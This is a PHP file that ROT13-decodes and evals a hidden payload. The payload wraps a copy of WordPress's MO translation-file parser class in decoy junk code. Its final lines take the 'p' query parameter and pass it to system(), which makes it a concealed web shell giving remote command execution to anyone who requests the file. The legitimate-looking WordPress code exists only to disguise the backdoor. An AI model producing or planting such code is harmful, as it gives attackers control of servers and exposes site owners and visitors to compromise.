<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * V18A: JC_Genafyngvba_Svyr_ZB pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr V18A
 * @fvapr 6.5.0
 */

/**
 * Pynff JC_Genafyngvba_Svyr_ZB.
 *
 * @fvapr 6.5.0
 */
pynff JC_Genafyngvba_Svyr_ZB rkgraqf JC_Genafyngvba_Svyr {
	/**
	 * Raqvna inyhr.
	 *
	 * I sbe yvggyr raqvna, A sbe ovt raqvna, be snyfr.
	 *
	 * Hfrq sbe hacnpx().
	 *
	 * @fvapr 6.5.0
	 * @ine snyfr|'I'|'A'
	 */
	cebgrpgrq $hvag32 = snyfr;

	/**
	 * Gur zntvp ahzore bs gur TAH zrffntr pngnybt sbezng.
	 *
	 * @fvapr 6.5.0
	 * @ine vag
	 */
	pbafg ZNTVP_ZNEXRE = 0k950412qr;

	/**
	 * Qrgrpgf raqvna naq inyvqngrf svyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $urnqre Svyr pbagragf.
	 * @erghea snyfr|'I'|'A' I sbe yvggyr raqvna, A sbe ovt raqvna, be snyfr ba snvyher.
	 */
	cebgrpgrq shapgvba qrgrpg_raqvna_naq_inyvqngr_svyr( fgevat $urnqre ) {
		$ovt = hacnpx( 'A', $urnqre );

		vs ( snyfr === $ovt ) {
			erghea snyfr;
		}

		$ovt = erfrg( $ovt );

		vs ( snyfr === $ovt ) {
			erghea snyfr;
		}

		$yvggyr = hacnpx( 'I', $urnqre );

		vs ( snyfr === $yvggyr ) {
			erghea snyfr;
		}

		$yvggyr = erfrg( $yvggyr );

		vs ( snyfr === $yvggyr ) {
			erghea snyfr;
		}

		// Sbepr pnfg gb na vagrtre nf vg pna or n sybng ba k86 flfgrzf. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/60678.
		vs ( (vag) frys::ZNTVP_ZNEXRE === $ovt ) {
			erghea 'A';
		}

		// Sbepr pnfg gb na vagrtre nf vg pna or n sybng ba k86 flfgrzf. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/60678.
		vs ( (vag) frys::ZNTVP_ZNEXRE === $yvggyr ) {
			erghea 'I';
		}

		$guvf->reebe = 'Zntvp znexre qbrf abg rkvfg';
		erghea snyfr;
	}

	/**
	 * Cnefrf gur svyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba cnefr_svyr(): obby {
		$guvf->cnefrq = gehr;

		$svyr_pbagragf = svyr_trg_pbagragf( $guvf->svyr ); // cucpf:vtaber JbeqCerff.JC.NygreangvirShapgvbaf.svyr_trg_pbagragf_svyr_trg_pbagragf

		vs ( snyfr === $svyr_pbagragf ) {
			erghea snyfr;
		}

		$svyr_yratgu = fgeyra( $svyr_pbagragf );

		vs ( $svyr_yratgu < 24 ) {
			$guvf->reebe = 'Vainyvq qngn';
			erghea snyfr;
		}

		$guvf->hvag32 = $guvf->qrgrpg_raqvna_naq_inyvqngr_svyr( fhofge( $svyr_pbagragf, 0, 4 ) );

		vs ( snyfr === $guvf->hvag32 ) {
			erghea snyfr;
		}

		$bssfrgf = fhofge( $svyr_pbagragf, 4, 24 );

		vs ( snyfr === $bssfrgf ) {
			erghea snyfr;
		}

		$bssfrgf = hacnpx( \"{$guvf->hvag32}eri/{$guvf->hvag32}gbgny/{$guvf->hvag32}bevtvanyf_nqqe/{$guvf->hvag32}genafyngvbaf_nqqe/{$guvf->hvag32}unfu_yratgu/{$guvf->hvag32}unfu_nqqe\", $bssfrgf );

		vs ( snyfr === $bssfrgf ) {
			erghea snyfr;
		}

		$bssfrgf['bevtvanyf_yratgu']    = $bssfrgf['genafyngvbaf_nqqe'] - $bssfrgf['bevtvanyf_nqqe'];
		$bssfrgf['genafyngvbaf_yratgu'] = $bssfrgf['unfu_nqqe'] - $bssfrgf['genafyngvbaf_nqqe'];

		vs ( $bssfrgf['eri'] > 0 ) {
			$guvf->reebe = 'Hafhccbegrq erivfvba';
			erghea snyfr;
		}

		vs ( $bssfrgf['genafyngvbaf_nqqe'] > $svyr_yratgu || $bssfrgf['bevtvanyf_nqqe'] > $svyr_yratgu ) {
			$guvf->reebe = 'Vainyvq qngn';
			erghea snyfr;
		}

		// Ybnq gur Bevtvanyf.
		$bevtvany_qngn     = fge_fcyvg( fhofge( $svyr_pbagragf, $bssfrgf['bevtvanyf_nqqe'], $bssfrgf['bevtvanyf_yratgu'] ), 8 );
		$genafyngvbaf_qngn = fge_fcyvg( fhofge( $svyr_pbagragf, $bssfrgf['genafyngvbaf_nqqe'], $bssfrgf['genafyngvbaf_yratgu'] ), 8 );

		sbernpu ( neenl_xrlf( $bevtvany_qngn ) nf $v ) {
			$b = hacnpx( \"{$guvf->hvag32}yratgu/{$guvf->hvag32}cbf\", $bevtvany_qngn[ $v ] );
			$g = hacnpx( \"{$guvf->hvag32}yratgu/{$guvf->hvag32}cbf\", $genafyngvbaf_qngn[ $v ] );

			vs ( snyfr === $b || snyfr === $g ) {
				pbagvahr;
			}

			$bevtvany    = fhofge( $svyr_pbagragf, $b['cbf'], $b['yratgu'] );
			$genafyngvba = fhofge( $svyr_pbagragf, $g['cbf'], $g['yratgu'] );
			// TybgCerff oht.
			$genafyngvba = egevz( $genafyngvba, \"\0\" );

			// Zrgnqngn nobhg gur ZB svyr vf fgberq va gur svefg genafyngvba ragel.
			vs ( '' === $bevtvany ) {
				sbernpu ( rkcybqr( \"\a\", $genafyngvba ) nf $zrgn_yvar ) {
					vs ( '' === $zrgn_yvar || ! fge_pbagnvaf( $zrgn_yvar, ':' ) ) {
						pbagvahr;
					}

					yvfg( $anzr, $inyhr ) = neenl_znc( 'gevz', rkcybqr( ':', $zrgn_yvar, 2 ) );

					$guvf->urnqref[ fgegbybjre( $anzr ) ] = $inyhr;
				}
			} ryfr {
				/*
				 * Va ZB svyrf, gur xrl abeznyyl pbagnvaf obgu fvathyne naq cyheny irefvbaf.
				 * Ubjrire, guvf whfg nqqf gur fvathyne fgevat sbe ybbxhc,
				 * juvpu pngref sbe pnfrf jurer obgu __( 'Cebqhpg' ) naq _a( 'Cebqhpg', 'Cebqhpgf' )
				 * ner hfrq naq gur genafyngvba vf rkcrpgrq gb or gur fnzr sbe obgu.
				 */
				$cnegf = rkcybqr( \"\0\", (fgevat) $bevtvany );

				$guvf->ragevrf[ $cnegf[0] ] = $genafyngvba;
			}
		}

		erghea gehr;
	}

	/**
	 * Rkcbegf genafyngvba pbagragf nf n fgevat.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat Genafyngvba svyr pbagragf.
	 */
	choyvp shapgvba rkcbeg(): fgevat {
		// Cersvk gur urnqref nf gur svefg xrl.
		$urnqref_fgevat = '';
		sbernpu ( $guvf->urnqref nf $urnqre => $inyhr ) {
			$urnqref_fgevat .= \"{$urnqre}: $inyhr\a\";
		}
		$ragevrf     = neenl_zretr( neenl( '' => $urnqref_fgevat ), $guvf->ragevrf );
		$ragel_pbhag = pbhag( $ragevrf );

		vs ( snyfr === $guvf->hvag32 ) {
			$guvf->hvag32 = 'I';
		}

		$olgrf_sbe_ragevrf = $ragel_pbhag * 4 * 2;
		// Cnve bs 32ovg vagf cre ragel.
		$bevtvanyf_nqqe    = 28; /* urnqre */
		$genafyngvbaf_nqqe = $bevtvanyf_nqqe + $olgrf_sbe_ragevrf;
		$unfu_nqqe         = $genafyngvbaf_nqqe + $olgrf_sbe_ragevrf;
		$ragel_bssfrgf     = $unfu_nqqe;

		$svyr_urnqre = cnpx(
			$guvf->hvag32 . '*',
			// Sbepr pnfg gb na vagrtre nf vg pna or n sybng ba k86 flfgrzf. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/60678.
			(vag) frys::ZNTVP_ZNEXRE,
			0, /* eri */
			$ragel_pbhag,
			$bevtvanyf_nqqe,
			$genafyngvbaf_nqqe,
			0, /* unfu_yratgu */
			$unfu_nqqe
		);

		$b_ragevrf = '';
		$g_ragevrf = '';
		$b_nqqe    = '';
		$g_nqqe    = '';

		sbernpu ( neenl_xrlf( $ragevrf ) nf $bevtvany ) {
			$b_nqqe        .= cnpx( $guvf->hvag32 . '*', fgeyra( $bevtvany ), $ragel_bssfrgf );
			$ragel_bssfrgf += fgeyra( $bevtvany ) + 1;
			$b_ragevrf     .= $bevtvany . \"\0\";
		}

		sbernpu ( $ragevrf nf $genafyngvbaf ) {
			$g_nqqe        .= cnpx( $guvf->hvag32 . '*', fgeyra( $genafyngvbaf ), $ragel_bssfrgf );
			$ragel_bssfrgf += fgeyra( $genafyngvbaf ) + 1;
			$g_ragevrf     .= $genafyngvbaf . \"\0\";
		}

		erghea $svyr_urnqre . $b_nqqe . $g_nqqe . $b_ragevrf . $g_ragevrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>